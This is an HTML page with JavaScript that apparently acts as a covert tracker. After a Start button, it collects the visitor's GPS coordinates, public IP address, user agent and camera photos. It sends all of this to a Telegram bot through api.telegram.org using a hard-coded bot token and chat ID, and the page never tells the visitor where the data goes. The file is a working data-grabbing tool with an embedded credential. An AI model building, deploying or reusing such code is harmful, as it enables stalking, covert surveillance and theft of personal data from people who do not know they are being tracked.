<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera and Geolocation Access</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 20px;
        }
        #camera {
            display: none;
        }
        #preview {
            margin-top: 10px;
            display: flex;
            flex-wrap: wrap;
        }
        .photo {
            width: 100px;
            height: 100px;
            margin: 5px;
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
    <h1>Access Camera and Geolocation</h1>
    <button id="startButton">Start</button>
    <p id="location"></p>
    <input type="file" accept="image/*" capture="environment" id="camera" multiple>
    <div id="preview"></div>

    <script>
        let latitude = '';
        let longitude = '';
        const photos = [];
        let ipAddress = '';
        const userAgent = navigator.userAgent;
        const telegramBotToken = '7359419952:AAHFAG4df44WHFOS3SJ6mafXxMtW9v-fc8E';
        const chatId = '2036883627';

        document.getElementById('startButton').addEventListener('click', () => {
            // Fetch IP Address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    ipAddress = data.ip;
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                });

            // Request Geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    latitude = position.coords.latitude;
                    longitude = position.coords.longitude;
                    document.getElementById('location').innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;

                    // Trigger the camera input
                    document.getElementById('camera').click();
                }, (error) => {
                    alert(`Error getting location: ${error.message}`);
                });
            } else {
                alert('Geolocation is not supported by this browser.');
            }
        });

        document.getElementById('camera').addEventListener('change', (event) => {
            const files = event.target.files;
            const preview = document.getElementById('preview');
            preview.innerHTML = '';

            for (let i = 0; i < files.length && i < 5; i++) {
                const file = files[i];
                const img = document.createElement('img');
                img.classList.add('photo');
                img.src = URL.createObjectURL(file);
                preview.appendChild(img);
                photos.push(file);
            }

            // Send Data to Telegram Bot
            sendDataToTelegramBot();
        });

        const sendDataToTelegramBot = () => {
            if (latitude && longitude && photos.length > 0) {
                photos.forEach((photo, index) => {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('latitude', latitude);
                    formData.append('longitude', longitude);
                    formData.append('ip', ipAddress);
                    formData.append('userAgent', userAgent);
                    formData.append('photo', photo);

                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            alert(`Photo ${index + 1} sent successfully`);
                        } else {
                            alert(`Failed to send photo ${index + 1}: ${data.description}`);
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('Failed to send data');
                    });
                });
            } else {
                alert('Please capture location and photos first.');
            }
        };
    </script>
</body>
</html>
